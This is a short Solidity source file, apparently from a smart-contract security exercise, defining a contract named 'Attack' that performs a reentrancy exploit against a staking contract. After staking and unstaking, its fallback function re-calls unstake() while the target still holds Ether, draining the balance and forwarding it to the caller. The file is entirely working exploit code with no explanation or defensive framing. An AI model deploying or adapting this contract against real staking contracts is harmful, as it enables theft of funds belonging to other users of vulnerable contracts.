//SPDX-License-Identifier: MIT
pragma solidity 0.8.15; 

interface IStake {
    function stake() external payable;
    function unstake() external;
}

contract Attack {
  address targetContract;

  constructor(address _targetContract) {
    targetContract = _targetContract;
  }
  function initialStaking() external payable {
    IStake(targetContract).stake{value: msg.value}();
    IStake(targetContract).unstake();
    uint256 amount = address(this).balance;
    payable(msg.sender).call{value: amount}("");
  }

  fallback() external payable {
    uint256 amount = address(targetContract).balance;
    if (amount > 1) IStake(targetContract).unstake();
  }
}